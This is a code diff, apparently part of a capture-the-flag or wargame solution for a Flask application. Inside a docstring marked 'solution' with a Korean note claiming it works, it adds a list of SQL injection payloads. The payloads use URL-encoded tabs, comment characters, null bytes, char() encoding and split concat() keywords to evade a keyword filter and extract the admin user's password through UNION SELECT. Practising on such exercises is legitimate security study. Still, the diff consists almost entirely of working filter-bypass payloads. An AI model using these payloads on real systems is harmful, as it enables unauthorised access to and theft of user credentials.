@@ -1,6 +1,21 @@
 '''
 solution..!
 
+
+이건 진짜 됨
+guest';%09%23
+
+'%09%23ASCII(111,114)%09uid='test%23
+
+
+guest'%09char(0x6F,0x72)%09uid='test
+guest'%09%4F%52uid='test';
+guest'%09uid='test'%09%00%00%09%00
+
+
+'concat('uni','on')%09concat('sele','ct)%09null,upw,null`concat('fr','om')`user`where`uid=concat('ad','min')`#
+'concat('uni','on')%09concat('sele','ct)%09null,upw,null%09concat('fr','om')%09user%09where%09uid=concat('ad','min')#
+'char(0x75,0x6E,0x69,0x6F,0x6E)%09char(0x73,0x65,0x6C,0x65,0x63,0x74)%09null,'1',null%09#
 '''
 import os
 from flask import Flask, request
